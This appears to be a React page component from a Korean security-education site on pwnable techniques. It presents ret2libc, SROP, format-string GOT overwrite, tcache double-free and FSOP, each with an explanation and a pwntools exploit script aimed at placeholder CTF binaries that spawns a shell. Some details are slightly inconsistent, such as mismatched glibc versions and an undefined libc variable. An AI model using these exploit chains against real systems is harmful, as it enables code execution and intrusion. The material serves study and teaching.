import SecurityLayout from './SecurityLayout'

const data = {
  icon: '💥',
  title: '포너블',
  desc: 'ret2libc, ROP, Format String, 힙 익스플로잇, FSOP',
  stats: [
    { value: '5', label: '기법' },
    { value: 'x86-64', label: '아키텍처' },
    { value: 'pwntools', label: '주요 도구' },
  ],
  topics: [
    {
      title: 'ret2libc — ASLR + NX 우회',
      difficulty: 'hard',
      tool: 'pwntools',
      explanation:
        'NX(스택 실행 불가)로 shellcode를 실행할 수 없을 때, libc의 system() 함수와 "/bin/sh" 문자열을 재활용하여 쉘을 획득하는 기법. PLT/GOT로 libc 주소를 leak한 뒤 ASLR을 우회한다.',
      steps: [
        'puts@plt로 puts@got 주소 출력 → libc base 계산',
        'libc_base + offset으로 system(), "/bin/sh" 주소 확정',
        'pop rdi; ret 가젯으로 rdi = &"/bin/sh" 설정',
        'ret2system으로 쉘 획득',
      ],
      code: `from pwn import *

# ── 환경 설정 ─────────────────────────────────
elf  = ELF('./vuln')
libc = ELF('./libc.so.6')
rop  = ROP(elf)

# p = process('./vuln')
p = remote('host', 1234)

# ── 1단계: libc base leak ─────────────────────
pop_rdi    = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = rop.find_gadget(['ret'])[0]      # 스택 정렬 (Ubuntu 18+)

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main     = elf.symbols['main']

payload  = b'A' * OFFSET                      # 버퍼 오버플로우
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)                       # puts(puts@got) → libc 주소 출력
payload += p64(main)                           # main으로 돌아와 2단계 실행

p.sendlineafter(b'> ', payload)
p.recvline()

leaked   = u64(p.recvline().strip().ljust(8, b'\\x00'))
libc_base = leaked - libc.symbols['puts']
log.success(f'libc base: {hex(libc_base)}')

# ── 2단계: system("/bin/sh") ──────────────────
system  = libc_base + libc.symbols['system']
bin_sh  = libc_base + next(libc.search(b'/bin/sh'))

payload2  = b'A' * OFFSET
payload2 += p64(ret_gadget)                    # 16바이트 스택 정렬
payload2 += p64(pop_rdi)
payload2 += p64(bin_sh)
payload2 += p64(system)

p.sendlineafter(b'> ', payload2)
p.interactive()`,
    },
    {
      title: 'SROP — Sigreturn Oriented Programming',
      difficulty: 'expert',
      tool: 'pwntools SigreturnFrame',
      explanation:
        'sigreturn 시스템 콜은 스택의 sigcontext 구조체를 통해 모든 레지스터를 한번에 복원한다. 가젯이 극히 제한된 환경에서도 단 하나의 syscall; ret 가젯으로 임의의 레지스터 상태를 만들 수 있다.',
      theory:
        'sigreturn (syscall 15) 호출 시:<br>rsp가 가리키는 sigcontext를 그대로 레지스터에 로드<br>→ rip, rsp, rdi, rsi, rdx, rax 모두 제어 가능<br>→ execve("/bin/sh", 0, 0) 직접 설정',
      steps: [
        'syscall; ret 가젯 주소 탐색',
        'pwntools SigreturnFrame으로 sigcontext 구성',
        'rax=15 (sigreturn), rip=syscall_gadget 설정',
        '구조체를 스택에 적재 후 sigreturn 트리거',
      ],
      code: `from pwn import *

elf = ELF('./srop_chall')
p   = process('./srop_chall')

# ── 가젯 탐색 ────────────────────────────────
syscall_ret = next(elf.search(asm('syscall; ret')))
pop_rax     = next(elf.search(asm('pop rax; ret')))
bin_sh_addr = next(elf.search(b'/bin/sh'))   # bss or 직접 write

# ── Sigreturn Frame 구성 ──────────────────────
frame         = SigreturnFrame()
frame.rax     = constants.SYS_execve   # 59
frame.rdi     = bin_sh_addr            # "/bin/sh"
frame.rsi     = 0                      # argv = NULL
frame.rdx     = 0                      # envp = NULL
frame.rip     = syscall_ret            # 다음 실행 위치

# ── Payload ───────────────────────────────────
payload  = b'A' * OFFSET
payload += p64(pop_rax)
payload += p64(constants.SYS_rt_sigreturn)   # rax = 15
payload += p64(syscall_ret)                   # sigreturn 트리거
payload += bytes(frame)                       # 가짜 sigcontext

p.sendline(payload)
p.interactive()`,
    },
    {
      title: 'Format String — 임의 주소 쓰기 (GOT Overwrite)',
      difficulty: 'hard',
      tool: 'pwntools fmtstr_payload',
      explanation:
        'printf()에 사용자 입력이 포맷 스트링으로 직접 전달될 때, %n으로 임의 주소에 쓰기가 가능하다. GOT를 system()으로 덮어 다음 printf 호출 시 쉘을 획득한다.',
      theory:
        '%{n}$p  → n번째 스택 인자 출력 (읽기)<br>%{val}c%{n}$hn → n번째 인자가 가리키는 주소에 val 쓰기<br>pwntools fmtstr_payload가 이를 자동 계산',
      code: `from pwn import *

elf = ELF('./fmt_chall')
p   = process('./fmt_chall')
context.arch = 'amd64'

# ── 1단계: offset 탐색 ────────────────────────
# $ python -c "print('%p.'*20)" | ./fmt_chall
# 스택에서 입력값이 몇 번째에 나타나는지 확인
OFFSET = 6   # 예: 6번째

# ── 2단계: libc leak ──────────────────────────
# %6$p 형태로 리턴 주소 또는 libc 주소 leak
p.sendline(f'%{OFFSET}$p'.encode())
leaked = int(p.recvline().strip(), 16)
libc_base = leaked - 0x21b97    # __libc_start_main+231 offset
system    = libc_base + libc.symbols['system']
log.success(f'system: {hex(system)}')

# ── 3단계: printf@got → system 덮어쓰기 ───────
writes  = { elf.got['printf']: system }
payload = fmtstr_payload(OFFSET, writes, write_size='short')

p.sendline(payload)

# 다음 printf("ls") 호출 → system("ls") 실행
p.sendline(b'/bin/sh\\x00')
p.interactive()`,
    },
    {
      title: 'Heap — tcache dup (Double Free → 임의 할당)',
      difficulty: 'expert',
      tool: 'pwntools / glibc 2.31',
      explanation:
        'glibc 2.28 이하에서 tcache는 double free를 검증하지 않아, 같은 청크를 두 번 free()하면 tcache에 동일 청크가 두 번 들어간다. fd 포인터를 target 주소로 조작하면 임의 주소에 malloc()이 가능하다.',
      theory:
        'tcache[size] → chunk_A → chunk_A → ...<br>1. free(A) → tcache: [A]<br>2. free(A) → tcache: [A→A] (루프)<br>3. malloc() → A 반환, fd 조작 → target 삽입<br>4. malloc() → A 반환<br>5. malloc() → target 주소 반환!',
      steps: [
        'malloc(0x18) → chunk_A 할당',
        'free(A) → free(A)  (double free)',
        '첫 번째 malloc에서 A 획득 후 A→fd = &__malloc_hook',
        '두 번째 malloc → A 재반환',
        '세 번째 malloc → __malloc_hook 주소 반환 → one_gadget 쓰기',
      ],
      code: `from pwn import *

p    = process('./heap_chall')
libc = ELF('./libc-2.27.so')

def alloc(size, data=b''):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'size: ', str(size).encode())
    if data:
        p.sendlineafter(b'data: ', data)
    return int(p.recvline().strip())

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())

def show(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', str(idx).encode())
    return p.recvline().strip()

# ── 1단계: heap leak & libc leak ─────────────
# ... (unsorted bin을 통한 libc 주소 leak)
libc_base    = leaked_addr - libc.symbols['__malloc_hook'] - 0x10
malloc_hook  = libc_base + libc.symbols['__malloc_hook']
one_gadget   = libc_base + 0x4f432   # 버전별 다름

log.success(f'__malloc_hook: {hex(malloc_hook)}')

# ── 2단계: tcache double free ────────────────
idx_a = alloc(0x18, b'AAAA')
free(idx_a)
free(idx_a)                           # double free!

# ── 3단계: fd 조작으로 __malloc_hook 삽입 ───
alloc(0x18, p64(malloc_hook))         # A 반환, fd = malloc_hook
alloc(0x18, b'dummy')                 # A 재반환
alloc(0x18, p64(one_gadget))          # malloc_hook 위치에 one_gadget 쓰기

# ── 4단계: malloc 트리거 → 쉘 ────────────────
alloc(0x18)                           # malloc_hook → one_gadget 실행
p.interactive()`,
    },
    {
      title: 'FSOP — File Stream Oriented Programming',
      difficulty: 'expert',
      tool: 'pwntools / glibc 2.23',
      explanation:
        '_IO_FILE 구조체의 vtable 포인터를 조작하여 fclose(), fflush() 등 파일 연산 시 임의 코드를 실행하는 기법. Heap 익스플로잇으로 _IO_list_all 체인을 조작한다.',
      theory:
        '_IO_FILE.vtable → _IO_file_jumps (함수 테이블)<br>__overflow, __sync 등 호출 시 vtable 경유<br>→ vtable을 가짜 구조체로 교체<br>→ 임의 함수 포인터 실행',
      code: `from pwn import *

# glibc 2.23 (vtable 검증 없음) 기준
elf  = ELF('./fsop_chall')
libc = ELF('./libc-2.23.so')
p    = process('./fsop_chall')

# ── libc 주소 계산 ────────────────────────────
# ... (libc leak 생략)
libc_base     = leaked - libc.symbols['puts']
system        = libc_base + libc.symbols['system']
_IO_list_all  = libc_base + libc.symbols['_IO_list_all']
_IO_str_jumps = libc_base + 0x3c3700   # 버전별 오프셋

# ── 가짜 _IO_FILE 구조체 구성 ─────────────────
# unsorted bin attack으로 _IO_list_all을 chunk+0x68로 덮기
fake_file = b'/bin/sh\\x00'            # _IO_FILE.flags = "/bin/sh"
fake_file += b'\\x00' * (0x38 - 8)
fake_file += p64(0)                    # _IO_write_base
fake_file += p64(0xffffffffffffffff)   # _IO_write_ptr (overflow 조건)
fake_file += b'\\x00' * (0x58 - 0x40)
fake_file += p64(system)              # _IO_wide_data → chain (fake vtable 위치)
fake_file += b'\\x00' * (0xd8 - 0x60)
fake_file += p64(_IO_str_jumps - 8)   # vtable 포인터 조작
# _IO_str_overflow → [vtable-8+0x18] = system 실행

# ── 트리거: malloc_printerr → _IO_flush_all_lockp ─
# ... (heap corruption 유발)
p.interactive()`,
    },
  ],
}

export default function Pwnable() {
  return <SecurityLayout data={data} />
}
